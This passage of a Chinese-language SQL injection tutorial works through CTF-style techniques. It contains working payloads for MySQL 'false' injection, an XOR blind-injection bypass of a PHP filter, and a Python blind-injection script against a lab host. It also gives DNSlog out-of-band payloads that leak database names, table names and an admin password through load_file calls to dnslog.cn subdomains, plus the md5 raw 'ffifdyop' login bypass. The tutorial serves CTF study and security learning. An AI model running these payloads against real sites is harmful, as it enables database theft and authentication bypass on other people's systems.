或运算：|
    插入'|0#, 拼接的语句: select * from user where username =''|0#';
异或运算：^
    插入'^0#, 拼接的语句: select * from user where username =''^0#';
移位操作：
    插入'>0#, 拼接的语句: 
    select * from user where username =''>0#';
  * 利用比较运算符
安全等于：
    '=01# 拼接的语句：where username=''=01#'
不等于<>(!=)
    '=0<>0# 拼接的语句：where username=''=0<>0#'
大小于>或-1# 拼接的语句：where username=''>-1#
  * 其他
    '+1 is not null#  'in(-1,1)#  'not in(1,0)#  'like 1#  'REGEXP 1#  'BETWEEN 1 AND 1#  'div 1#  'xor 1#  '=round(0,1)='1  '<>ifnull(1,2)='1
##### 综合利用
false注入这种注入方式有的优势就是， **在某些特定时候可以绕过WAF或者是一些其他的绕过** 。
这里举例一道题
    query("set names utf8");  
    function randStr($lenth=32){
         $strBase = "1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
         $str = "";
         while($lenth>0){
           $str.=substr($strBase,rand(0,strlen($strBase)-1),1);
           $lenth --;
         }
        return $str;
    }
    if($install){
         $sql = "create table `user` (          `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,          `username` varchar(30) NOT NULL,          `passwd` varchar(32) NOT NULL,          `role` varchar(30) NOT NULL        )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci ";
         if($conn->query($sql)){
            $sql  = "insert into `user`(`username`,`passwd`,`role`) values ('admin','".md5(randStr())."','admin')";
            $conn -> query($sql);
         }
     }  
    function filter($str){
          $filter = "/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";
          if(preg_match($filter,$str)){
              die("you can't input this illegal char!");
          }
          return $str;
      }   
    function show($username){
       global $conn;
       $sql = "select role from `user` where username ='".$username."'";
       $res = $conn ->query($sql);
       if($res->num_rows>0){
            echo "$username is ".$res->fetch_assoc()['role'];
       }else{
            die("Don't have this user!");
       }
     }  
    function login($username,$passwd){
         global $conn;
         global $flag;
         $username = trim(strtolower($username));
         $passwd = trim(strtolower($passwd));
         if($username == 'admin'){
             die("you can't login this as admin!");
         }  
         $sql = "select * from `user` where username='".$conn->escape_string($username)."' and passwd='".$conn->escape_string($passwd)."'";
         $res = $conn ->query($sql);
         if($res->num_rows>0){
               if($res->fetch_assoc()['role'] === 'admin') exit($flag);
         }else{ 
               echo "sorry,username or passwd error!";
         }
     }
      function source(){
          highlight_file(__FILE__);
     }
      $username = isset($_POST['username'])?filter($_POST['username']):"";
      $passwd = isset($_POST['passwd'])?filter($_POST['passwd']):"";
      $action = isset($_GET['action'])?filter($_GET['action']):"source";
    switch($action){
        case "source": source(); break ;
        case "login" : login($username,$passwd);break;
        case "show" : show($username);break; 
    }
我们注意到`filter()`函数
    $filter = "/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&|".urldecode('%09')."|".urldecode("%0a")."|".urldecode("%0b")."|".urldecode('%0c')."|".urldecode('%0d')."|".urldecode('%a0')."/i";
这里看起来过滤的比较多，其中and，or还有&，|都被过滤了，这个时候就可以利用 **false进行盲注** 。
可以在show函数利用查询的时候注入，
    username = "admin'^!(mid((passwd)from(-{pos}))='{passwd}')='1"
这里官方给出的就是利用异或，其实这里并不需要 admin 只要是一串字符串就可以
异或会使字符串都转为浮点型，都变为了0，由于`0=0^0 -> 1^0 -> 1`
当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多还有就是构造的payload比较简短，例如'`+`'、'`^`'、'`/4#`'
这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。
##### 盲注脚本
    import requests
    flag = ''
    for i in range(1,33):
        for str in "abcdefghijklmnopkrstuvwxyz":
            url = "http://cc248a80-6376-49cf-b846-16c188eeb1fc.node3.buuoj.cn/Less-8/?id='^(mid((select database())from(-{0}))='{1}')='1".format(i,str+flag)
            res = requests.get(url=url)
            if "You are in..........." in res.text:
                flag = str+flag
                print(flag)
#### DNS注入
##### 原理
通过子查询，将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志。
在无法直接利用的情况下，但是可以通过DNS请求,通过DNSlog，把数据外带，用DNS解析记录查看。
##### LOAD_FILE() 读取文件的函数
> 读取文件并返回文件内容为字符串。
>
>
> 要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。
> 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。
**注：这个功能不是默认开启的，需要在mysql配置文件加一句 secure_file_priv=**
##### DNSLOG平台:
> 
>
> 
##### UNC路径
> UNC路径通用命名规则，也称通用命名规范、通用命名约定，类似\softer这样的形式的网络路径。
UNC路径的 **格式** ： **\server\sharename\directory\filename**
等同于 **SELECT LOAD_FILE('//库名.1806dl.dnslog.cn/abc'**
去访问 库名.1806dl.dnslog.cn 的服务器下的共享文件夹abc。
然后1806dl.dnslog.cn的子域名的解析都是在某台服务器，然后他记录下来了有人请求访问了error.1806dl.dnslog.cn，然后在DnsLog这个平台上面显示出来了
payload示例：
    ?id=1 and load_file(concat('//', database(),'.htleyd.dnslog.cn/abc'))
    ?id=1 and load_file(concat('//', (select table_name from information_schema.tables where table_schema=database() limit 0,1 ),'.htleyd.dnslog.cn/abc'))
    ?id=1 and load_file(concat('//',(select column_name from information_schema.columns where table_name=’admin’ and table_schema=database() limit 2,1),'.htleyd.dnslog.cn/abc'))
    ?id=1 and load_file(concat('//',(select password from admin limit 0,1),'.htleyd.dnslog.cn/abc'))
#### '".md5($pass,true)."' 登录绕过
很多站点为了安全都会利用这样的语句：
    SELECT * FROM users WHERE password = '.md5($password,true).';
`md5(string,true)` 函数在指定了true的时候，是返回的原始 16
字符二进制格式，也就是说会返回这样子的字符串：`'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c`：
这不是普通的二进制字符串，而是 `'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c` 这种，这样的话就会和前面的形成闭合，构成万能密码。
    SELECT * FROM users WHERE password = ''or'6.......'
这就是永真的了，这就是一个万能密码了相当于 `1' or 1=1#` 或 `1' or 1#`。
> 但是我们思考一下为什么 6\xc9]\x99\xe9!r,\xf9\xedb\x1c 的布尔值是true呢？
>
> 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数（这类似于PHP的弱类型）。要注意的是这种情况是必须要有单引号括起来的，比如
> password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于
> password=‘xxx’ or
> true，所以返回值就是true。这里不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如 password=‘xxx’
> or 1，那么返回值也是 true。（xxx指代任意字符）
接下来就是找到这样子的字符串，这里给出两个吧。
ffifdyop：
    content: ffifdyop
    hex: 276f722736c95d99e921722cf9ed621c
    raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
    string: 'or'6]!r,b
129581926211651571912466741651878684928：
    content: 129581926211651571912466741651878684928
    hex: 06da5430449f8f6f23dfc1276f722738
    raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8
    string: T0Do#'or'8
参考自：WHOAMI的总结
[https://blog.csdn.net/lixiangminghate/article/details](https://blog.csdn.net/lixiangminghate/article/details/80466257)